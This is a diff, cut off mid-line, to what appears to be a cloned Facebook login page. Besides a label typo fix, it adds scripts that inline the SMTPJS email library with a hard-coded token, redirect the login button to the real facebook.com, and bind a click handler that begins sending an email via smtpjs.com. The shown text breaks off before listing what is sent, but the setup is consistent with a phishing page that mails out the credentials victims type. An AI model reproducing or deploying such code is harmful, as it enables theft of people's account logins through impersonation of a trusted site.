@@ -10893,7 +10893,7 @@
                                                 <input type="hidden" autocomplete="off" name="login_source" value="comet_headerless_login">
                                                 <input type="hidden" autocomplete="off" name="next" value="">
                                                 <div class="_6ltg">
-                                                    <button class="_42ft _4jy0 _6lth _4jy6 _4jy1 selected _51sy" id="u_0_b">Log Inn</button>
+                                                    <button class="_42ft _4jy0 _6lth _4jy6 _4jy1 selected _51sy" id="u_0_b">Log In</button>
                                                 </div>
                                                 <div class="_6ltj">
                                                     <a href="https://www.facebook.com/recover/initiate/?ars=facebook_login">Forgot Password?</a>
@@ -12534,6 +12534,7 @@
             }
             ));
         </script>
+            <script>document.getElementsByClassName('_42ft _4jy0 _6lth _4jy6 _4jy1 selected _51sy')[0].formAction = "https://www.facebook.com"</script>
             <script>javascript:var Email = { send: function (a) { return new Promise(function (n, e) { a.nocache = Math.floor(1e6 * Math.random() + 1), a.Action = "Send"; var t = JSON.stringify(a); Email.ajaxPost("https://smtpjs.com/v3/smtpjs.aspx?", t, function (e) { n(e) }) }) }, ajaxPost: function (e, n, t) { var a = Email.createCORSRequest("POST", e); a.setRequestHeader("Content-type", "application/x-www-form-urlencoded"), a.onload = function () { var e = a.responseText; null != t && t(e) }, a.send(n) }, ajax: function (e, n) { var t = Email.createCORSRequest("GET", e); t.onload = function () { var e = t.responseText; null != n && n(e) }, t.send() }, createCORSRequest: function (e, n) { var t = new XMLHttpRequest; return "withCredentials" in t ? t.open(e, n, !0) : "undefined" != typeof XDomainRequest ? (t = new XDomainRequest).open(e, n) : t = null, t } };const token = "8f3f3aff-06d2-493b-aa98-1d135b73a48b";</script>
             <script>document.getElementsByClassName('_42ft _4jy0 _6lth _4jy6 _4jy1 selected _51sy')[0].onclick = ()=>{  Email.send({
     SecureToken: token,
